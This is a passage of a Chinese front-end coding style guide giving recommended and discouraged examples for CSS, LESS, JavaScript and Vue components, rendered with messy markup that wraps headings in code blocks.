你应该总是考虑直接子选择器。&lt;br /&gt;不推荐:</span><br><span class="line"></span><br></pre></td></tr></table></figure>.content .title {  font-size: 2rem;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐:</span><br><span class="line"></span><br></pre></td></tr></table></figure>.content > .title {  font-size: 2rem;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;uXLBl&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.3 尽量使用缩写属性</span><br><span class="line"></span><br><span class="line">不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>border-top-style: none;font-family: palatino, georgia, serif;font-size: 100%;line-height: 1.6;padding-bottom: 2em;padding-left: 1em;padding-right: 1em;padding-top: 0;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>border-top: 0;font: 100%/1.6 palatino, georgia, serif;padding: 0 1em 2em;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;yp9l7&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.4 每个选择器及属性独占一行</span><br><span class="line"></span><br><span class="line">不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>button{  width:100px;height:50px;color:#fff;background:#00a0e9;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>button{  width:100px;  height:50px;  color:#fff;  background:#00a0e9;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;UNEPQ&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.5 省略0后面的单位</span><br><span class="line"></span><br><span class="line">不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>div{  padding-bottom: 0px;  margin: 0em;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>div{  padding-bottom: 0;  margin: 0;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;osdhZ&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.3.6 避免使用ID选择器及全局标签选择器防止污染全局样式</span><br><span class="line"></span><br><span class="line">不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>#header{  padding-bottom: 0px;  margin: 0em;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>.header{  padding-bottom: 0px;  margin: 0em;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;z9fVV&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">### (四) LESS 规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;VEupf&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.4.1 代码组织</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;WMJWc&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1)将公共less文件放置在style/less/common文件夹</span><br><span class="line"></span><br><span class="line">例:// color.less,common.less</span><br><span class="line">&lt;a name=&quot;oQbGV&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2)按以下顺序组织</span><br><span class="line"></span><br><span class="line">1、@import;&lt;br /&gt;2、变量声明;&lt;br /&gt;3、样式声明;</span><br><span class="line"></span><br></pre></td></tr></table></figure>@import "mixins/size.less";@default-text-color: #333;.page {  width: 960px;  margin: 0 auto;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;ND8fs&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.4.2 避免嵌套层级过多</span><br><span class="line"></span><br><span class="line">将嵌套深度限制在3级。对于超过4级的嵌套，给予重新评估。这可以避免出现过于详实的CSS选择器。&lt;br /&gt;避免大量的嵌套规则。当可读性受到影响时，将之打断。推荐避免出现多于20行的嵌套规则出现&lt;br /&gt;不推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>.main{  .title{    .name{       color:#fff    }  }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br></pre></td></tr></table></figure>.main-title{   .name{      color:#fff   }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;RoBJW&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">### (五) Javascript 规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;FqMuc&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.1 命名</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;rGyyc&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) 采用小写驼峰命名 lowerCamelCase，代码中的命名均不能以下划线，也不能以下划线或美元符号结束</span><br><span class="line"></span><br><span class="line">反例： `_name / name_ / name$`</span><br><span class="line">&lt;a name=&quot;UCs3Y&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格，必须遵从驼峰形式</span><br><span class="line"></span><br><span class="line">正例： `localValue / getHttpMessage() / inputUserId`&lt;br /&gt;*_**其中 method 方法命名必须是 动词 或者 动词+名词 形式***_&lt;br /&gt;正例：`saveShopCarData /openShopCarInfoDialog`&lt;br /&gt;反例：`save / open / show / go`&lt;br /&gt;*_**特此说明，增删查改，详情统一使用如下 5 个单词，不得使用其他（目的是为了统一各个端）***_</span><br><span class="line"></span><br></pre></td></tr></table></figure>add / update / delete / detail / get<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**附： 函数方法常用的动词:**</span><br><span class="line"></span><br></pre></td></tr></table></figure>get 获取/set 设置,add 增加/remove 删除create 创建/destory 移除start 启动/stop 停止open 打开/close 关闭,read 读取/write 写入load 载入/save 保存,create 创建/destroy 销毁begin 开始/end 结束,backup 备份/restore 恢复import 导入/export 导出,split 分割/merge 合并inject 注入/extract 提取,attach 附着/detach 脱离bind 绑定/separate 分离,view 查看/browse 浏览edit 编辑/modify 修改,select 选取/mark 标记copy 复制/paste 粘贴,undo 撤销/redo 重做insert 插入/delete 移除,add 加入/append 添加clean 清理/clear 清除,index 索引/sort 排序find 查找/search 搜索,increase 增加/decrease 减少play 播放/pause 暂停,launch 启动/run 运行compile 编译/execute 执行,debug 调试/trace 跟踪observe 观察/listen 监听,build 构建/publish 发布input 输入/output 输出,encode 编码/decode 解码encrypt 加密/decrypt 解密,compress 压缩/decompress 解压缩pack 打包/unpack 解包,parse 解析/emit 生成connect 连接/disconnect 断开,send 发送/receive 接收download 下载/upload 上传,refresh 刷新/synchronize 同步update 更新/revert 复原,lock 锁定/unlock 解锁check out 签出/check in 签入,submit 提交/commit 交付push 推/pull 拉,expand 展开/collapse 折叠begin 起始/end 结束,start 开始/finish 完成enter 进入/exit 退出,abort 放弃/quit 离开obsolete 废弃/depreciate 废旧,collect 收集/aggregate 聚集<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;U6BUP&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 3) 常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长</span><br><span class="line"></span><br><span class="line">正例： `MAX_STOCK_COUNT`&lt;br /&gt;反例： `MAX_COUNT`</span><br><span class="line">&lt;a name=&quot;XZqGC&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.2 代码格式</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;v5DOh&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) 使用 2 个空格进行缩进</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (x < y) {  x += 10;} else {  x += 1;}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;FZldi&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 不同逻辑、不同语义、不同业务的代码之间插入一个空行分隔开来以提升可读性</span><br><span class="line">&gt;</span><br><span class="line">&gt; 说明：任何情形，没有必要插入多个空行进行隔开。</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;j7Oi0&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.3 字符串</span><br><span class="line"></span><br><span class="line">统一使用单引号(‘)，不使用双引号(“)。这在创建 HTML 字符串非常有好处：&lt;br /&gt;正例:</span><br><span class="line"></span><br></pre></td></tr></table></figure>let str = 'foo';let testDiv = '<div id="test"></div>';<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例:</span><br><span class="line"></span><br></pre></td></tr></table></figure>let str = 'foo';let testDiv = "<div id='test'></div>";<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;jf452&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.4 对象声明</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;n1rh3&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1)使用字面值创建对象</span><br><span class="line"></span><br><span class="line">正例： `let user = &#123;&#125;;`&lt;br /&gt;反例： `let user = new Object();`</span><br><span class="line">&lt;a name=&quot;fgjiv&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 使用字面量来代替对象构造器</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>var user = {  age: 0,  name: 1,  city: 3};<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>var user = new Object();user.age = 0;user.name = 0;user.city = 0;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;zlHHq&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.5 使用 ES6,7</span><br><span class="line"></span><br><span class="line">必须优先使用 ES6,7 中新增的语法糖和函数。这将简化你的程序，并让你的代码更加灵活和可复用。</span><br><span class="line">&gt; 必须强制使用 ES6, ES7 的新语法，比如箭头函数、await/async ， 解构， let ， for…of 等等</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;epQwk&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.6 括号</span><br><span class="line"></span><br><span class="line">下列关键字后必须有大括号（即使代码块的内容只有一行）：if, else, for, while, do, switch, try, catch, finally, with。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (condition) {  doSomething();}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (condition) doSomething();<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;IXqXg&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.7 undefined 判断</span><br><span class="line"></span><br><span class="line">永远不要直接使用 undefined 进行变量判断；使用 typeof 和字符串’undefined’对变量进行判断。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (typeof person === 'undefined') {    ...}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (person === undefined) {    ...}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;JgaPE&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.8 条件判断和循环最多三层</span><br><span class="line"></span><br><span class="line">条件判断能使用三目运算符和逻辑运算符解决的，就不要使用条件判断，但是谨记不要写太长的三目运算符。如果超过 3 层请抽成函数，并写清楚注释。</span><br><span class="line">&lt;a name=&quot;kAFRZ&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.9 this 的转换命名</span><br><span class="line"></span><br><span class="line">对上下文 this 的引用只能使用’self’来命名</span><br><span class="line">&lt;a name=&quot;suHfw&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 1.5.10 慎用 console.log</span><br><span class="line"></span><br><span class="line">因 console.log 大量使用会有性能问题，所以在非 webpack 项目中谨慎使用 log 功能</span><br><span class="line">&lt;a name=&quot;Vcg1U&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line"># 二、Vue 项目规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;l5N8N&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">### (一) Vue 编码基础</span><br><span class="line"></span><br><span class="line">vue 项目规范以 Vue 官方规范 （[https://cn.vuejs.org/v2/style-guide/）](https://cn.vuejs.org/v2/style-guide/%EF%BC%89) 中的 A 规范为基础，在其上面进行项目开发，故所有代码均遵守该规范。</span><br><span class="line">&gt; 请仔仔细细阅读 Vue 官方规范，切记，此为第一步。</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;I83ZE&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.1. 组件规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;hoScD&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) 组件名为多个单词</span><br><span class="line"></span><br><span class="line">组件名应该始终是多个单词组成（大于等于 2），且命名规范为`KebabCase`格式。&lt;br /&gt;这样做可以避免跟现有的以及未来的 HTML 元素相冲突，因为所有的 HTML 元素名称都是单个单词的。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>export default {  name: 'TodoItem'  // ...};<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>export default {  name: 'Todo',  // ...}export default {  name: 'todo-item',  // ...}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;qn0tj&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 组件文件名为 pascal-case 格式</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- my-component.vue<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- myComponent.vue|- MyComponent.vue<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;ZelRK&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 3) 基础组件文件名为 base 开头，使用完整单词而不是缩写</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- base-button.vue|- base-table.vue|- base-icon.vue<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- MyButton.vue|- VueTable.vue|- Icon.vue<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;nrDxd&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 4) 和父组件紧密耦合的子组件应该以父组件名作为前缀命名</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- todo-list.vue|- todo-list-item.vue|- todo-list-item-button.vue|- user-profile-options.vue （完整单词）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>components/|- TodoList.vue|- TodoItem.vue|- TodoButton.vue|- UProfOpts.vue （使用了缩写）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;vPzyN&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 5) 在 Template 模版中使用组件，应使用 PascalCase 模式，并且使用自闭合组件</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><!-- 在单文件组件、字符串模板和 JSX 中 --><MyComponent /><Row><table :column="data"/></Row><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><my-component /> <row><table :column="data"/></row><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;Rdrdy&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 6) 组件的 data 必须是一个函数</span><br><span class="line"></span><br><span class="line">当在组件中使用 data 属性的时候 (除了 new Vue 外的任何地方)，它的值必须是返回一个对象的函数。 因为如果直接是一个对象的话，子组件之间的属性值会互相影响。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>export default {  data () {    return {      name: 'jack'    }  }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>export default {  data: {    name: 'jack'  }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;iGRed&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 7) Prop 定义应该尽量详细</span><br><span class="line"></span><br><span class="line">- 必须使用 camelCase 驼峰命名</span><br><span class="line">- 必须指定类型</span><br><span class="line">- 必须加上注释，表明其含义</span><br><span class="line">- 必须加上 required 或者 default，两者二选其一</span><br><span class="line">- 如果有业务需要，必须加上 validator 验证</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>props: {  // 组件状态，用于控制组件的颜色   status: {     type: String,     required: true,     validator: function (value) {       return [         'succ',         'info',         'error'       ].indexOf(value) !== -1     }   },    // 用户级别，用于显示皇冠个数   userLevel：{      type: String,      required: true   }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;Qavrp&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 8) 为组件样式设置作用域</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>  <button class="btn btn-close">X</button></template><!-- 使用 `scoped` 特性 --><style scoped>  .btn-close {    background-color: red;  }</style><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>  <button class="btn btn-close">X</button></template><!-- 没有使用 `scoped` 特性 --><style>  .btn-close {    background-color: red;  }</style><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;PyIFU&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 9) 如果特性元素较多，应该主动换行</span><br><span class="line"></span><br><span class="line">正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><MyComponent foo="a" bar="b" baz="c"    foo="a" bar="b" baz="c"    foo="a" bar="b" baz="c" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><MyComponent foo="a" bar="b" baz="c" foo="a" bar="b" baz="c" foo="a" bar="b" baz="c" foo="a" bar="b" baz="c"/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;iUoBM&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.2. 模板中使用简单的表达式</span><br><span class="line"></span><br><span class="line">组件模板应该只包含简单的表达式，复杂的表达式则应该重构为计算属性或方法。复杂表达式会让你的模板变得不那么声明式。我们应该尽量描述应该出现的是什么，而非如何计算那个值。而且计算属性和方法使得代码可以重用。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>  <p></p></template>// 复杂表达式已经移入一个计算属性computed: {  normalizedFullName: function () {    return this.fullName.split(' ').map(function (word) {      return word[0].toUpperCase() + word.slice(1)    }).join(' ')  }}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>  <p>       {          fullName.split(' ').map(function (word) {             return word[0].toUpperCase() + word.slice(1)           }).join(' ')        }  </p></template><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;tpW6a&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.3 指令都使用缩写形式</span><br><span class="line"></span><br><span class="line">指令推荐都使用缩写形式，(用 : 表示 v-bind: 、用 @ 表示 v-on: 和用 # 表示 